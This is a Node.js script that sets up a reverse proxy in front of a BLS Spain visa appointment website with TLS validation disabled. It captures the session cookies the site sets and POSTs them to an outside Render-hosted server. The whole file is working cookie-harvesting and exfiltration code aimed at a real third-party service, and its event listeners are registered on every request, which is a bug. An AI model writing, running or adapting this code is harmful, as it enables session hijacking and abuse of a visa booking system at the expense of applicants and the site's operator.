const http = require('http'); // Core module (no need to install)
const https = require('https'); // Core module (no need to install)
const httpProxy = require('http-proxy'); // Installed via npm
const fetch = require('node-fetch'); // Installed via npm

// Create a proxy server
const proxy = httpProxy.createProxyServer({
    target: 'https://southafrica.blsspainglobal.com',
    secure: false, // Disable TLS certificate validation
    changeOrigin: true, // Change the origin of the host header to the target URL
    agent: new https.Agent({
        rejectUnauthorized: false, // Disable TLS certificate validation
    }),
});

// Proxy server to capture cookies
const proxyServer = http.createServer((req, res) => {
    console.log(`Proxying request to: https://southafrica.blsspainglobal.com${req.url}`);

    // Intercept the response to capture cookies
    proxy.on('proxyRes', (proxyRes, req, res) => {
        const cookies = proxyRes.headers['set-cookie'];
        if (cookies) {
            console.log('Captured Cookies:', cookies);

            // Forward cookies to your Render server
            fetch('https://test-em43.onrender.com/store-cookies', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ cookies }),
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error(`HTTP error! Status: ${response.status}`);
                }
                return response.json();
            })
            .then(data => console.log('Cookies forwarded to Render server:', data))
            .catch(error => console.error('Error forwarding cookies:', error));
        }
    });

    // Handle errors in the proxy
    proxy.on('error', (err, req, res) => {
        console.error('Proxy error:', err);
        res.writeHead(500, { 'Content-Type': 'text/plain' });
        res.end('Proxy error: ' + err.message);
    });

    // Forward the request to the BLS website
    proxy.web(req, res);
});

// Start the proxy server
const PORT = 3001; // Port for the proxy server
proxyServer.listen(PORT, () => {
    console.log(`Proxy server running on http://localhost:${PORT}`);
});